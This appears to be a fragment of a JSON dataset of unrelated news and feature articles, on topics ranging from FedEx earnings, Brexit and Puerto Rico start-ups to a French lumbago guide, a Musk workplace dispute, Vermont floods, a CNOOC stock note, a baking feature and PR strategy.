      "text": "FedEx\u2019s Q2 Earnings Tumble, Even More Than Wall Street Expected \n[Stay on top of transportation news: Get TTNews in your inbox .] \nFedEx Corp. reported lower-than-expected second-quarter fiscal year 2020 earnings Dec. 17, missing Wall Street analysts\u2019 expectations. \nFor the quarter ending Nov. 30, the Memphis, Tenn.-based shipping giant reported net income was $560 million, or $2.13 per diluted share \u2014 slipping from $935 million, or $3.51 a share, for the same period a year ago. \nQuarterly revenue declined to $17.3 billion from $17.8 billion during the same time in 2018. \nWall Street analysts had been projecting the company would earn $2.80 a share and have revenue of $17.68 billion, according to Nasdaq.com. \nCompany officials acknowledged this has been a particularly tough quarter. \nSmith \n\u201cFiscal 2020 is a year of continued significant challenges and changes for FedEx, particularly in the quarter just ended due to the compressed shipping season,\u201d CEO Fred Smith said in a statement. \u201cWe have significantly enhanced our e-commerce capabilities with strategic initiatives, including year-round seven-day FedEx Ground delivery, enhanced large package capabilities and the insourcing of FedEx SmartPost packages. These changes have been well-received by the marketplace as reflected in our record volumes this peak season. While we have experienced some higher-than-expected expenses this quarter, we forecast FedEx Ground operating margins to rebound to the teens in our fiscal fourth quarter as the bow wave of costs for these changes is absorbed.\u201d \nFedEx said the operating results declined \u201cdue to weak global economic conditions, increased FedEx Ground costs from expanded service offerings, [and] the loss of business from a large customer.\u201d \nThat large customer FedEx spoke about is Amazon.com. Heading into the final holiday push, Amazon announced Dec. 15 it was blocking its third-party sellers from using FedEx Ground and Home services for Amazon Prime deliveries because Amazon said there had been a decline in FedEx\u2019s performance. \nAmazon said the ban on using FedEx would continue until FedEx\u2019s performance improves. In a statement, FedEx said of Amazon\u2019s decision, \u201cThe overall impact to our business is minuscule.\u201d \nThis summer, Amazon and FedEx ended a long-standing business relationship. FedEx announced in June that it wouldn\u2019t renew a U.S. air-shipping deal with Amazon, then it said in August that a ground-delivery contract wouldn\u2019t be renewed when it expired. FedEx still will have a contract with Amazon for international deliveries. \nIt is estimated FedEx handled about 4% of Amazon\u2019s volume, with Atlanta-based UPS Inc. moving an estimated 17% and the United States Postal Service about 33%. \nMarc Wulfraat, a logistics consultant and founder of MWPVL International, estimates that Amazon will be able to handle about 45% of its own volume this year as it plows investment into sorting hubs, delivery stations and support for contract drivers. \nWant more news?

      "title": "How to Change Your Career from Graphic Design to UX",
      "text": "Do you want to make more money? Do you want a positive work change? A lot of graphic designers decided to change their careers to UX. In this article, you\u2019ll know the best way how to do it. Let\u2019s start! \nBeauty or usability? \nModern companies don\u2019t really want to choose between these two options. They don\u2019t like to do it because they want both options at once. Nowadays this approach is pretty normal. \nA great designer should be able to create not only an amazing design but also a user-friendly one. If you want to be a good-paid UX designer you should understand all your future clients will demand from you thoughtful design, created with user care in mind. That\u2019s why you shouldn\u2019t choose between beauty and usability. \nCan\u2019t combine it? If it\u2019s so then the first step for you is to learn how to do it. \nThe big gap between graphic and UX design \nWhat is a UX design website ? \nUX design is human-centered design. Trying to define the difference between graphic and UX designer, you\u2019ll see the big gap. All points that you\u2019ll use to describe this gap is your steps and guidelines to get your career transition. \nFor instance, the best graphic design is always something beautiful. But the best UX design consists of 3 points: \n\u00b7 Look; \n\u00b7 Feel; \n\u00b7 Usability. \nThat\u2019s why you need to know some basic programming knowledge to become a UX designer. \nProgramming and UX design \nOf course, it\u2019d be great if you attempt a basic programming course but it\u2019s not so necessary. You don\u2019t need to be able to create that endless code to become a UX designer. All you need is to get an understanding of some basic steps of the developing process. \nWhy should you know that? Because it\u2019ll help you to create a better design. Remember, user-friendly is key for this profession. \nWhat do graphic and UX designers have in common? \nAny doubts, a graphic designer can become a UX designer easier than a person from a completely different field of activity. Let\u2019s see what do they have in common! \n\u00b7 Creativity thinking; \n\u00b7 Emotional design; \nPrototyping. \nBut what are the differences? \nGraphic designers are more pixel-focused. At the same time UX designers more focused on users and what is good for them. \nThat\u2019s why UX designers are usually multidisciplinary. \nReading articles about UX design will gift you a lot of useful and valuable knowledge. It\u2019ll help you to fulfill this gap. \nOne big stepf \nAs you already know you don\u2019t necessarily need to attempt programming courses to become a UX designer. But it\u2019d be a good idea to find a course of UX design. \nThere are a lot of online courses on the Internet. Choose one that fits you more than others. It\u2019ll definitely help you on your way. \nWhat about the portfolio? \nSo, you decided to become a UX designer. Then you should change your portfolio and CV. \nDon\u2019t put there anything you don\u2019t want to do in the near future. You aren\u2019t a graphic designer anymore. You are a UX designer! Don\u2019t be too shy. Just write it down on your CV. \nDescribe your design skills. All in all, these two professions are pretty close. At least graphic designers and UX designers use the same terms in their speeches. \nDo you still have some doubts? \nThis transition from graphic to UX designer isn\u2019t so difficult as you might think at the beginning of this article. Time and perseverance \u2013 that\u2019s all you need to achieve this goal. \nUse online courses. Read UX design articles. Adopt the experience of those who are more successful than you are. You should want to get this change. You should dream about it. \nBy the way, any dream isn\u2019t impossible till you keep dreaming. \nThe post How to Change Your Career from Graphic Design to UX appeared first on SaveDelete .",

      "text": "12 Mar 2019 --- It\u2019s crunch time yet again for UK Prime Minister Theresa May today as MPs prepare to vote for the second time as a crucial part of the ongoing Brexit process. UK-EU negotiations have taken a major step forward after May secured \u201clegally binding\u201d changes to the deal following last-minute talks in Strasbourg last night. May stresses that these changes mean the backstop, designed to avoid a hard border in Ireland, could not become permanent and claims that these changes will now satisfy Parliament. And now, despite being urged to call off today\u2019s vote in the House of Commons in case of another huge defeat, May is pushing ahead with trying to get the backing needed on the Withdrawal Agreement which sets out an orderly exit from the EU. However, if she doesn\u2019t succeed there could be more votes this week that could see Parliament voting to extend Article 50 and rule out a no-deal Brexit.",

      "title": "In Puerto Rico, Building a Disaster-Proof Business Is Part of Recovery",
      "text": "For nearly a year after rain stopped falling on Puerto Rico, the island was without full power . For months, thousands of businesses closed and did not reopen . And for nearly as long, internet was scarce. So when Emmanuel Oquendo and Israel Figueroa Font\u00e1nez found connectivity along a central strip in San Juan known as the Milla de Oro (the Golden Mile), they plopped down on the sidewalk, opened their laptops, and worked from the street. \n\u201cIt was during Hurricane Maria that we found a purpose,\u201d Mr. Oquendo said. \nMr. Oquendo and Mr. Figueroa had been trying to start a company, BrainHi , that automated communication with doctors\u2019 offices. If a human receptionist did not pick up the phone, BrainHi\u2019s artificial intelligence chatbot would step in to answer questions, helping the offices that were severely understaffed after the hurricane. \nNow, one and a half years later, BrainHi has clients around the world. The 15-person team has recently moved to a new office on the Milla de Oro. From his window, Mr. Oquendo can see the place on the sidewalk where he worked on his laptop after the storm. \nBrainHi got its start as one of the companies in a start-up accelerator program in San Juan organized by Parallel18 . For a little over three years, Parallel18 has worked with 168 tech-based start-ups, each of which receive $40,000 in equity-free funding, co-working space and coaching. Parallel18 also started a pre-accelerator program after Hurricane Maria to foster local start-ups in earlier stages of development. \nEven before Hurricane Maria, Puerto Rico had been in a public debt crisis . An exemption in the United States tax code had given mainland companies tax breaks on income earned in Puerto Rico. But that exemption had expired, large corporations had been moving their factories off the island and, for that and other reasons , like the inability to declare bankruptcy the way full states could, the economy fell into a long recession from which it has yet to recover. \nThe hope is that by investing in entrepreneurs like Mr. Oquendo and Mr. Figueroa, Puerto Rico\u2019s economy will be able to withstand exogenous shocks like changes to the tax code, predatory investments or future natural disasters. As the start-up ecosystem grows, the entrepreneurs in the center of it are trying to power a new wave of locally owned businesses that are resilient enough to weather future turmoil. \nThe numbers show that these entrepreneurship initiatives may be working. According to a University of Puerto Rico study , in March 2018, businesses in Puerto Rico started opening at faster rates than they were closing. The rebounding of businesses across the island was not universal , and many have not recovered. But the Global Entrepreneurship Monitor, a data set on entrepreneurship that is used by the United Nations and the World Economic Forum, published data showing that, from 2017 to 2018, entrepreneurial activity in Puerto Rico was on the rise. \nImage \nDenisse Rodr\u00edguez Col\u00f3n, the executive director of Colmena66 , a resource hub for people trying to start businesses in Puerto Rico, was surprised by the immediate uptick in entrepreneurial activity after Hurricane Maria. Ms. Rodr\u00edguez thought that she would be out of a job after the hurricane. Instead, Colmena66\u2019s hotline started ringing constantly. \n\u201cPeople were saying, \u2018I\u2019ve lost everything, so that idea I\u2019ve had for three years, I\u2019m not afraid anymore. I need to build this business because I\u2019m out of a job,\u2019\u201d Ms. Rodr\u00edguez said. \nColmena66 and Parallel18 have offices next door to each other, and both receive funding from the nonprofit Puerto Rico Science, Technology & Research Trust . The two organizations have different missions, but they work together closely to create a pipeline of support for new business owners. \nThe number of applicants to Parallel18\u2019s incubator program are the highest they\u2019ve ever been, the group says. Last year\u2019s cohorts of start-ups almost doubled their revenue generated from the year before. Marie Custodio, outreach manager at Parallel18, attributes some of the increased start-up activities to a change in attitudes after the hurricane. \n\u201cIt was an awakening,\u201d she said. \u201cBefore the hurricane, people thought that having a corporate job or being an employee was safe. But after the hurricane, nothing was safe or secure.\u201d \nManufacturing Social Change \nNine miles south of Parallel18, in the Caimito district of San Juan, sits a small yellow factory surrounded by palm trees. Inside there are two sewing machines, a blanket stitch machine, some hand sewing workstations and to-do lists on the wall. These are the manufacturing headquarters for the footwear start-up Isle\u00f1as . \nKarla L\u00f3pez Rivera, the founder of Isle\u00f1as, moved back to Puerto Rico in April 2018 to join Parallel18\u2019s pre-accelerator program. Born and raised in Puerto Rico, Ms. L\u00f3pez had been living and working as a footwear designer in New York City. \n\u201cMaria really pushed the decision for me to move back,\u201d she said. \u201cI\u2019d been away for 14 years. I had those feelings of urgency to come back and help.\u201d \nImage \nImage \nThe company has three employees working in its factory in Puerto Rico, where it manufactures four styles of espadrilles. By June, its team will have expanded to six people. These employees are a big reason that Ms. L\u00f3pez wanted to start a company. \n\u201cWe\u2019re committed to social change through manufacturing,\u201d Ms. L\u00f3pez said. She is becoming partners with another female-founded start-up, the apparel brand Retazo , to provide employment for skilled seamstresses who lost their jobs when large garment factories in Puerto Rico closed in the 1980s and 1990s. \nA Homecoming for Engineers \nA few weeks ago, BrainHi hosted a d\u00eda familiar, or family day, for the company. Seeing his co-workers surrounded by their families was a heart-touching moment for Mr. Oquendo, who is chief executive of BrainHi. Five of his employees left jobs at Silicon Valley technology companies, including Airbnb and Lyft, to move back to Puerto Rico and work at BrainHi. \n\u201cThey were reunited with their families,\u201d Mr. Oquendo said. \u201cIt gave validation to the importance of helping people come back home and be with their families, boyfriends, girlfriends, and loved ones.\u201d \nCreating well-paying jobs that entice young, skilled employees to stay in Puerto Rico has been a constant struggle for the island\u2019s economy. Over the past 10 years, Puerto Rico has lost 10 percent of its population as workers leave the island in search of better job opportunities elsewhere. Since Hurricane Maria, another 130,000 people, or 4 percent of the population , have left. \nMr. Oquendo and his co-founder Mr. Figueroa, who is BrainHi\u2019s chief technology officer, met when they were engineering students at the University of Puerto Rico at Mayag\u00fcez, on the west coast. \nBut when Mr. Oquendo graduated, he was one of very few of his classmates who stayed in Puerto Rico. \u201cBasically, all of my friends have left the island one year after they graduated,\u201d he said, citing better job opportunities in the mainland United States. \nBut Mr. Oquendo is trying to do his part to reverse the tide of out-migration by creating jobs and hiring back some of the engineers who left. And he\u2019s not alone. \nOne of the companies to graduate recently from Parallel18\u2019s accelerator program, Libros787, moved into offices next door to Parallel18\u2019s. While Libros787 has not moved far from Parallel18\u2019s tight-knit community of start-ups, the company\u2019s founders have made a business of selling Puerto Rican books to the far-flung diaspora. \n\u201cWe wanted to create a bridge to people living outside Puerto Rico, in the U.S. and around the world,\u201d said Carlos Goyco Blechman, co-founder and chief executive of Libros787 . \nLibros787 sells Puerto Rican books for about half the price of its competitors, like Amazon. Mr. Goyco is able to sell these books so cheaply because he sells directly from publishing houses in Puerto Rico. According to Mr. Goyco, partnering with publishing houses became easier after Hurricane Maria. \n\u201cPeople were very willing to help us,\u201d Mr. Goyco said. \u201cIt wouldn\u2019t have been that easy to collaborate with other companies without the hurricane.\u201d \nImage \nMr. Goyco got the idea to start Libros787 when Hurricane Maria cost him what he called a good corporate job. He had been working in book distribution for large multinational companies in Puerto Rico, like Walmart and Walgreens. When Hurricane Maria hit, many of these stores never reopened. \nTwo months later, with support from Parallel18, Mr. Goyco had Libros787\u2019s website running. Today, he said, the company processes from 400 to 600 orders each month and continues to grow steadily. \nThe Parallel18 staff is also looking to grow the successes of their program beyond Puerto Rico. \n\u201cWhat happened with Puerto Rico, it didn\u2019t happen in only Puerto Rico, but the whole Caribbean,\u201d Ms. Custodio said, referring to the damage caused by Hurricanes Irma and Maria. \nShe hopes that by building a start-up ecosystem across the Caribbean, they will be better prepared to deploy regional solutions in response to future hurricanes. Together with Facebook, Parallel18 is making plans to begin Startup Hub Caribbean, which will be the first accelerator that Facebook has set up in the Caribbean. \nMs. Rodr\u00edguez also sees tech start-ups, which are adept at aggregating resources across supply chains, as key players in strengthening Puerto Rico\u2019s self-sufficiency. \n\u201cIn Puerto Rico, we imported 85 percent of everything we consumed. After the hurricane, that percentage went up to 95 percent because we lost all our crops. That puts us in a very vulnerable position as a community,\u201d she said. \u201cOur food chain in P.R. is so segmented and fragmented that that doesn\u2019t happen naturally unless we have entrepreneurs coming in.\u201d \nMs. Custodio has already seen proof of how this can work. Every week, she gets local Puerto Rican produce delivered to her doorstep, courtesy of PRoduce! Home Box , a food delivery start-up that graduated from Parallel18\u2019s latest cohort. \nThe start-ups coming out of Parallel18 have also captured the attention of the federal Small Business Administration. After meeting the founders of Cleancult , a former Parallel18 start-up that makes green cleaners, Linda McMahon, the agency\u2019s administrator, organized a stop in San Juan for the S.B.A. Innovation Research tour in November 2019 . \n\u201cWe\u2019ve worked from sidewalks, we\u2019ve done so many things,\u201d Mr. Oquendo said. \u201cI think as a company we\u2019re super resilient. There\u2019s nothing that is going to stop us.\u201d",

      "text": "C\u2019\u00e9tait il y a un mois. Aur\u00e9lien, 52 ans, jouait au tennis lorsque soudain, il a ressenti une petite g\u00eane dans le bas du dos. Mais, de retour chez lui, des douleurs aigu\u00ebs se r\u00e9veillent, c\u00f4t\u00e9 gauche. Impossible d\u2019enfiler un pantalon et m\u00eame d\u2019attraper sa brosse \u00e0 dents. La semaine s\u2019\u00e9coule, p\u00e9niblement, jusqu\u2019au moment de faire les courses. \u00ab J\u2019ai fait tr\u00e8s attention mais trente minutes plus tard, les douleurs \u00e9taient multipli\u00e9es par quatre, c\u2019\u00e9tait atroce ! raconte cet habitant d\u2019Houilles (Yvelines). Mes muscles \u00e9taient comme du b\u00e9ton, j\u2019avais l\u2019impression d\u2019\u00eatre dans une camisole de force. \u00bb \nLe lumbago , mal aigu dans le bas du dos , frappe particuli\u00e8rement au printemps \u00e0 l\u2019heure o\u00f9 l\u2019on retourne, plein d\u2019entrain, au jardin, ou l\u2019on renfile ses chaussures de sport, apr\u00e8s une p\u00e9riode de paresse hivernale. \u00ab Nous n\u2019avons pas de donn\u00e9es scientifiques sur le sujet, commente Bruno Fautrel, chef du service rhumatologie \u00e0 la Piti\u00e9-Salp\u00eatri\u00e8re, \u00e0 Paris. Mais on sait qu\u2019il y a plus de lumbagos lorsqu\u2019on reprend une activit\u00e9 physique. \u00bb Une tendance qu\u2019a aussi remarqu\u00e9e la rhumatologue Fran\u00e7oise Azoulai : \u00ab Au mois de mars, les gens recommencent \u00e0 bouger et ils se font mal. \u00bb \nQue faire si la douleur persiste ? \nPour \u00e9viter un tour de rein , \u00e9tirez-vous, optez pour des mouvements doux lorsque vous taillez votre haie, r\u00e9partissez un poids de trente kilos en deux sacs de quinze. Et si malgr\u00e9 tout, vous vous bloquez le bas du dos, sachez qu\u2019au-del\u00e0 de quatre \u00e0 cinq jours de douleur, il faut consulter. M\u00eame conseil si les lumbagos se r\u00e9p\u00e8tent tous les mois. \u00ab Un m\u00e9decin jugera apr\u00e8s examen si un bilan compl\u00e9mentaire est n\u00e9cessaire, explique Fran\u00e7oise Azoulai, rhumatologue, pr\u00e8s de Pau (Pyr\u00e9n\u00e9es-Atlantiques). Ces douleurs peuvent cacher des rhumatismes, une infection, de l\u2019ost\u00e9oporose\u2026 \u00bb, poursuit-elle. \nDes anti-inflammatoires, des d\u00e9contractants musculaires soulagent. Mais si possible, ne restez pas inactif. \u00ab Je conseille de marcher 15 \u00e0 30 minutes avec de bonnes chaussures, puis de s\u2019allonger dix minutes, les jambes sur une chaise \u00e0 90\u00b0 et de renouveler cet exercice plusieurs fois par jour \u00bb, encourage la sp\u00e9cialiste. La chaleur sera aussi votre meilleur alli\u00e9. On pense bien s\u00fbr \u00e0 la bouillotte. \u00ab Mais sachez que le s\u00e8che-cheveux marche tr\u00e8s bien \u00bb, pr\u00e9cise Fran\u00e7oise Azoulai. \nAttention, ne vous asseyez pas dans votre baignoire au risque de ne plus en sortir. Privil\u00e9giez la chaise, avec un coussin, au fauteuil, ne pi\u00e9tinez pas. \u00ab Pour sortir du lit, mettez-vous de c\u00f4t\u00e9 et redressez-vous avec les bras \u00bb, indique-t-elle. Enfin si les galipettes ne sont pas proscrites, les positions les plus simples remplaceront les acrobaties. Au moins pendant quelques jours\u2026 \nQu\u2019est-ce qu\u2019un tour de rein ? \nLe tour de rein ou lumbago se traduit par d\u2019intenses douleurs au niveau des vert\u00e8bres lombaires. Cons\u00e9quence d\u2019un faux mouvement, d\u2019un effort brusque, du port d\u2019une charge trop lourde, les terminaisons nerveuses sont irrit\u00e9es et les muscles contractent pour prot\u00e9ger cette partie du dos inflamm\u00e9e. C\u2019est ce qu\u2019on appelle \u00ab la r\u00e9action antalgique \u00bb. Elle est en g\u00e9n\u00e9ral b\u00e9nigne. Les enfants, eux, ne sont pas cens\u00e9s en avoir. Si c\u2019est le cas, il peut s\u2019agit de petites malformations sans gravit\u00e9 mais il est n\u00e9cessaire de consulter.",

      "title": "'I will nuke you': Elon Musk was accused of shoving and threatening a former Tesla employee \u2014 but the company's board says there was no physical altercation (TSLA)",
      "text": "Reuters \nTesla's board of directors investigated an incident between CEO Elon Musk and a former employee, the company confirmed Friday. \nBloomberg News first reported on the altercation, citing sources that said the incident involved physical contact. \nMusk has been known for a temperamental management style, as documented by many past reports. \nTesla CEO Elon Musk was involved in an altercation with a former employee who had recently resigned, Bloomberg News reported Friday citing sources with \"direct knowledge\" of the incident. \nAccording to the report, an employee had returned to the electric car company's office in September post-resignation to say goodbye to former coworkers when word reached Musk that he had quit. It was at that point, Bloomberg reports, that Musk unleashed a profanity-laced tirade against the former employee. \n\"I will nuke you,\" Musk yelled as the incident spilled from inside Tesla to the parking lot, according to one of Bloomberg News' sources. \nTesla confirmed in a statement to Business Insider that an incident between Musk and a former employee took place, but said there was no \"physical altercation.\" \n\" Elon did exit an employee at our Fremont delivery center last year due to concerns about his performance, however there was no physical altercation whatsoever,\" a spokesperson said. \"Those reports are simply untrue as confirmed by numerous people that observed the incident first-hand.\" \nTesla's board of directors also confirmed in a statement with the same wording that it had completed a review of the incident and also found no evidence of a physical altercation. \nFriday's report is far from the first time Musk has been accused of temper issues. In December, Wired reported that some Tesla employees were told told not to walk past his desk in case it jeopardized their career. \nMany sources who spoke to Wired at the time also described frequent outbursts where Musk would shout at people and call them \"idiots.\" A senior engineering executive said employees even had a name for Musk's behavior: \"the idiot bit.\" \nRead Bloomberg's full report here. \nDo you work at Tesla?

      "title": "Vermont Officials Assess Spring Flood Damage",
      "text": "Vermont state and local officials are assessing damage from flooding caused by heavy rains and snowmelt that led to road closures, some evacuations and a rescue from a flooded parking lot. \nSome roads remained closed Tuesday, but most of the water had receded. No injuries were reported. \nAmong the hardest hit areas Sunday night and Monday were along the White River in Bethel and Stockbridge, in the Londonderry area and along the Otter Creek in Rutland County, said Mark Bosma, a spokesman for Vermont Emergency Management. \nIf the damage reaches a certain threshold, the state could apply to the Federal Emergency Management Agency for disaster assistance \n\u201cOh it was crazy,\u201d Herb Kuendig, an emergency management coordinator for the town of Pittsfield, told NECN-TV. \n\u201cIt just happened so quickly over the night,\u201d he said. \u201cNo one realized what was going on until the morning.\u201d \nA snowboarder from Niagara Falls, New York, slept in his vehicle in a parking lot in Killington overnight and awoke to rising waters, police said. He had planned to snowboard at Killington Resort Monday. He heard the rain overnight but didn\u2019t realize the flooding until it was too late, police said. Emergency crews rescued him by boat. \nThe flooding marked the first time since Tropical Storm Irene in 2011 that floodwaters from the White River rose onto Route 107 in the Bethel-Stockbridge area, the Transportation Agency\u2019s Ernie Patnoe said Tuesday. The 2011 flooding destroyed much of the major east-west highway in the area. It was rebuilt in 119 days and constructed to withstand future flooding. \nPatnoe said the highway passed its first test. \u201cThe roadway performed as expected and received no significant damage,\u201d he said. \nCopyright 2019 Associated Press.

      "title": "CNOOC Limited (NYSE:CEO): Taking a Closer Look at This Stock",
      "text": "Investors may be looking at shares of CNOOC Limited (NYSE:CEO) with renewed interest over the past few trading sessions. After a recent scan, the stock has been seen trading near the $186.47 level. Staying on top of the equity market can be difficult. Knowing what information is important and how to interpret that information can be the difference between a good portfolio and a great one. \nWhen dealing with the stock market, investors have to be constantly on their toes. Investors who have had success in the past using a certain method for stock picking may eventually realize that the method no longer produces the same results as it once did. Expecting that the market environment will change and being able to react to those changes can greatly help the investor when the time comes. While investor confidence can be a positive thing, complacency can lead to future frustration and poor portfolio performance. Seasoned investors know that no bull market will last forever just as no bear market will last forever. Being prepared for any situation can greatly help the investor navigate the market when changes do occur. \nShares of CNOOC Limited (NYSE:CEO) currently have an average target price of 200. This is the consensus number using estimates given by polled analysts. Professional sell-side analysts that track the stock are constantly monitoring the company to assess where they believe shares will be moving in the future. Price target projections can be calculated using various methods. Many investors will follow stock target prices, especially when analysts make revisions. \nThe average investor might not have the time to monitor every single movement of a certain stock. Tracking the historical performance may help provide some valuable insight on where the stock may be trending in the future. Looking back over the last 4 weeks, shares of CNOOC Limited (NYSE:CEO) have moved 10.8%. Over the last 5 days, the stock has seen a change of 2.35%. Looking at the last 12 week period, we note that the stock has moved 13.74%. Since the beginning of the calendar year, we note that shares have changed 22.32%. Investors will often track the current stock price relative to its 52-week high and low levels. The 52-week high is currently 200.98, and the 52-week low is resting at 142.38. When shares are trading near the 52-week high or 52-week low, investors may be on the lookout for a breakout. \nSell-side analysts often undertake stock analysis to give their opinions of whether they believe that shares should be bought, sold, or held. Using ratings provided by analysts polled by Zacks Research, we note that the current average broker rating on shares of CNOOC Limited (NYSE:CEO) is currently 2.2. The recommendation falls on a scale between 1 and 5. A broker rating of 1 would translate into a Strong Buy. A rating of 5 would indicate a Strong Sell recommendation. This consensus broker rating may help shed some light on how the sell-side is currently viewing company stock. After a recent check, we can see that 2 sell-side analysts have rated the stock a Strong Buy or Buy, based analysts polled by Zacks Research. Professional investors often incorporate various strategies when approaching the stock market. Capitalizing on market dips can be highly profitable when thoroughly researched and executed. Closely monitoring earnings, news, and analyst views may play an important role in equity study. \nThere are many different strategies that investors use when entering the stock market. Beating the market is no easy task, and many veteran investors would echo that sentiment. When following the day to day happenings in the stock market, it can be easy to get distracted. There is a lot of emphasis on what is happening in the moment, and it can be tempting for investors to get caught up in the chaos. Everyday market fluctuations can sometimes cause investors to second guess their stock selections. Investors who are able to filter out the noise and focus on the most pertinent information may find themselves in an elevated position in relation to the rest of the investing field.",

      "title": "Eat: These Date-and-Walnut Bars Are Food for the Gods",
      "text": "At the end of each school year, Margarita Manzke and her seven siblings piled into the family car in Manila, where her father ran a fish-sauce factory, to drive to her mother\u2019s resort in Subic Bay, on the west coast of Luzon, about two hours away. They spent summers there, not swimming and sunbathing like other families on vacation from the city. Not bobbing down the waves on boogie boards, or falling asleep under umbrellas with books in one hand and drinks in the other. Even as a teenager, Manzke was an entrepreneur. And summertime, free from the structure of daily classes and homework, was for one thing, and one thing only: engaging in the sport of friendly competition with her brothers and sisters. \nOne summer, Manzke and her siblings learned to burn sugar to make the dark, sweet base for homemade sago at gulaman , the drink full of tapioca pearls and jellies. One of her brothers sold these chilled, at a prized location, to the sweaty, thirsty tourists that packed the beach. Big deal! Manzke paid a local butcher to slaughter three whole pigs and roast the meat so she could sell plates of crisp-skinned lechon to the same hungry beachgoers. When one of her sisters turned an empty cottage on the resort property into a makeshift bakery \u2014 a cache of sweets and layered cakes \u2014 Manzke leveled up, learning to make chocolate cakes filled with a soft custardy center and draw her own regular customers. Their father encouraged the children to be creative with their businesses to earn money for the school year, but they didn\u2019t require much encouragement. \u201cIt was so fun,\u201d Manzke said. \u201cI look back and laugh, because I was really kind of insane.\u201d \nBy the time Manzke was in high school, she\u2019d turned her attention to a book of Filipino desserts and sweets \u2014 a thin pamphlet, less than 50 pages long, that she found in the kitchen. It didn\u2019t look like much, but in it, she found a recipe for the golden-colored date-and-walnut bars known in the Philippines as food for the gods. The sweet is especially popular around Christmas, when it\u2019s sold in individually wrapped squares, like tiny fruitcakes. All December, at home in Manila, Manzke made batches of the bars after school, then woke up at 4 a.m. to pack them in the cute boxes she built out of pieces of corrugated cardboard, glue and dark green paint. \nImage \nSome batches were oilier than others. Some batches softer. Manzke liked the bars especially tender and chewy, packed with fruit and nuts. And as she refined the technique, based on the basic recipe in the pamphlet, more and more orders came in from her friends, and her friends\u2019 parents, and her parents\u2019 friends. She baked every day to keep up. \u201cIt was a lot of trial and error,\u201d said Manzke, who noticed that creaming the butter too much, or using a light hand with the dates, would push the bars toward a more caky texture. Like any pastry chef in the making, she was now in a sweet, ongoing competition with herself, comparing each batch with the previous ones, and slowly moving toward an ideal. \nManzke went on to culinary school, then moved to Los Angeles to work in restaurant kitchens. She sells her perfected date-and-walnut bars at R\u00e9publique, the Los Angeles restaurant and bakery she runs with her husband, Walter, where the pastry case is packed each morning with strawberry-pistachio tarts, banana-Nutella crostatas and big chocolate-chip cookies. If you can\u2019t get there, you can make them at home: Cut the dates nice and big. Keep an eye on the butter and sugar, so the mixture doesn\u2019t get overly pale and airy. And don\u2019t skimp on the fruit and nuts. If you follow Manzke\u2019s simple techniques, you\u2019ll get the chewiness that makes the bars so special on your very first try.",

      "title": "Approaching Public Relations In The Age Of New Media",
      "text": "One of the biggest struggles faced by marketers today is how to balance new media (digital and social) with traditional media (TV, radio, print). Marketers tend to pay attention to the \u201cnew shiny idea,\u201d often taking action on new media campaigns. But one traditional medium that has bridged the gap between the two worlds is public relations. \nPublic relations (PR) is work that helps a business or individual cultivate a positive reputation with the public through various paid and earned communications. Twenty years ago, PR worked through traditional media and in-person engagement; whereas today, we now have digital, social and influencer marketing -- even virtual reality -- to consider. Unlike TV, radio or print, PR has evolved and is as relevant, if not more relevant, today than it was 20 years ago. \nBelow are a few examples of how PR has evolved in the digital world. \nRefined Influencer Marketing \nInfluencer marketing has been a hot ticket for several years now. As consumers continue to look to social proof and opinion, influencer marketing has evolved. \nI expect this year to be a big year for nano-influencers -- those with a following of 1,000 to roughly 5,000, and who often have much higher engagement from their fan bases. Due to their smaller following, their recommendations and opinions are often perceived as more genuine and trustworthy. \nBrands are using influencers and other engagement tools to connect with consumers on a more personal level. For instance, H&M used influencers and polling tools to target their millennial consumers, find out their preferences and collect feedback for the designs. \nWhile the world of influencer marketing operated much like the Wild West in previous years, I believe it is beginning to show us more savvy and refined programming than ever before. \nMultichannel PR \nReaching the public has evolved from standard print, online and TV placements to a multitude of avenues. As mentioned above, influencer marketing is key to being relatable to younger consumers, as is the emerging world of podcasts. Brands can play off the influencer posts and drive new followers to connect on their own social channels. The impression and traffic to one web article can be leveled up by connecting stories and sharing with different brands\u2019 fans, whether it be through reposting business news on LinkedIn or sharing a perfect consumer-facing press placement in Instagram Stories with a swipe-up link. \nToday, PR must be broadened to multiple channels to deepen and expand the reach to target consumers. The message simply cannot break through the clutter when only focused on one medium. \nThe millennial-driven company Bumble has done a great job at touching on all channels through its influencer partnerships, such as its partnership with The Chainsmokers for the Bumble Beats dating app, in which the band hosted a concert ticket giveaway at the first college road stop of the campaign, or thought leadership interviews centered around new workplace initiatives like \u201cThe Hive.\u201d \nContent Performance \nIt takes more than a heartwarming story or innovative product launch to earn a story in 2019. Increasingly, reporters and publications are being asked to deliver metrics such as article views, clicks, social media shares and likes. Therefore, your brand must be able to offer more than a great story by showing a willingness to help amplify that story across a variety of networks. \nThis is something I think all PR teams should be offering in 2019 as part of the pitch for earned media. There are different audiences to reach on various social media platforms, in newsletters, etc., that should be utilized when important and noteworthy press is earned. \nIHOP was able to show how sharing news and information across different platforms can increase the engagement of consumers. With the brand\u2019s stunt, changing its name to IHOb last year, the company was able to garner stories published by a variety of outlets and on social media platforms, as the news was virally shared. \nVirtual Media \nAs tech continuously upgrades and shares information through artificial intelligence, PR strategies will begin to include voice-searchable content. Many consumers are using a virtual assistant to provide everyday information, from the news to the weather outside. I believe earned and paid media will be transformed to be easily referenced by virtual assistants, reaching targeted audiences more efficiently. \nGoogle Assistant already shares information from search results. Asking \u201cOK, Google, what\u2019s the latest news?\u201d or \u201cOK, Google, how do I get rid of a cough?\u201d results in top answers read aloud to the user. The future of these results will become even more specific and useful as more data is collected, making ideal earned placements with detailed information increasingly important. \nModern Day Metrics \nPR and marketing results have historically been difficult to track in terms of return on investment. Common practice in PR used to be measuring ad value equivalency and potential impressions for an earned media placement. However, times have changed and the advancements in digital have given PR pros modern new tools for measuring success across a variety of attributes. \nMetrics platforms are helping brands understand their positions by providing a variety of analytics at their fingertips. On a single dashboard, brands can now track things like their share of voice among competitors, true audience metrics and reader engagement with content to determine which avenues and messages are successfully converting. \nThe examples above show how public relations is still doing what it did a century ago by \u201ccultivating a positive reputation,\u201d but is now using 21st-century tools and techniques to deliver the message. The way I see it, PR has adapted with the times, unlike the rest of traditional marketing and is staying relevant by taking the best of the old and combining it with the best of the new.",

